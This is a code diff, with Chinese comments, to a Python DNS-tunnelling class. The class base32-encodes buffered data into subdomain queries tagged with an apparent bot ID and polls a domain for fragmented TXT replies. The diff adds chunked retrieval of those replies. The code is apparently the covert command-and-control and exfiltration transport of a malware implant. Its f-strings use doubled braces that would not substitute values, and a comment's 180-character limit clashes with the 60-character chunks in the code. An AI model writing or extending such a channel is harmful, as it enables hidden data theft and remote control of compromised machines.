@@ -91,20 +91,32 @@ class _DS:
         u.sendto(q, (s._h, s._p))
         resp = u.recv(4096)
         u.close()
-        parts = _parse_txt(resp)
+        return _parse_txt(resp)
+    def _resolve(s, name):
+        parts = s._one(name)
+        # 分片响应标记 s<total>（小写 s 不与 base32 字母冲突）→ 逐片拉取
+        if len(parts) == 1 and parts[0].startswith(b"s") and parts[0][1:].isdigit():
+            total = int(parts[0][1:].decode())
+            out = []
+            for i in range(total):
+                ps = s._one(f"r{{i}}.{{s._bid}}.{{s._dom}}")
+                if not ps or not ps[0]:
+                    return b""
+                out.append(ps[0])
+            return _b32d(b"".join(out).decode())
         return _b32d("".join(p.decode() for p in parts)) if parts else b""
     def _query(s):
         data = s._buf
         s._buf = b""
         if not data:
-            return s._one(f"poll.{{s._bid}}.{{s._dom}}")
+            return s._resolve(f"poll.{{s._bid}}.{{s._dom}}")
         b32 = _b32e(data)
         # 帧 base32 分片（≤180 字符/段）逐段查询，收最后一段的响应
         chunks = [b32[i:i + 60] for i in range(0, len(b32), 60)]
         resp = b""
         for i, ch in enumerate(chunks):
             name = f"{{ch}}.{{i}}.{{len(chunks)}}.{{s._bid}}.{{s._dom}}"
-            resp = s._one(name)
+            resp = s._resolve(name)
         return resp
     def close(s):
         pass
